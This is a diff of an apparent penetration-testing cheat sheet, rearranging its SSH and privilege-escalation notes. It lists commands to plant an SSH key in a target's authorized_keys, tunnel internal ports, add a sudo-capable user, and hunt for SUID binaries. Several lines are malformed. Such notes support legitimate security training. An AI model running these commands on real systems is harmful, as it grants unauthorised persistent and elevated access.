@@ -432,13 +432,15 @@ get file.txt -
 [*] (22) SSH
 ssh-add -D
 
-yes | ssh-keygen -t ed25519 -f key -N '' > /dev/null; cat key.pub
-ssh $USERNAME@$TARGET -i key.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
+ssh-keygen -t ed25519 -f key -N ''; cat key.pub
 -PubkeyAcceptedKeyTypes (ssh-rsa, ecdsa-sha2-nistp256, ecdsa-sha2-nistp384, ecdsa-sha2-nistp521, ssh-ed25519, ssh-dss)
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
 $USERNAME@$TARGET -i key.pub
-
 nano key; chmod 600 key; $USERNAME@$TARGET -i key -o PubkeyAcceptedAlgorithms=ssh-rsa
+
+ssh $USERNAME@$TARGET -i key.pub -L 33060:Localhost:33060 -L 5000:Localhost:5000
+
+
 
 [*] (23) Telnet
 telnet --user '$USERNAME' $TARGET
@@ -679,6 +681,7 @@ scp -r ~/Upload $USERNAME@$TARGET:~
 [*] Privilege Escalation
 adduser temp --uid 1047
 usermod -aG sudo temp
+
 find / -perm /4000 2>/dev/null | xargs ls -la
 sudo -l
 netstat -tuln
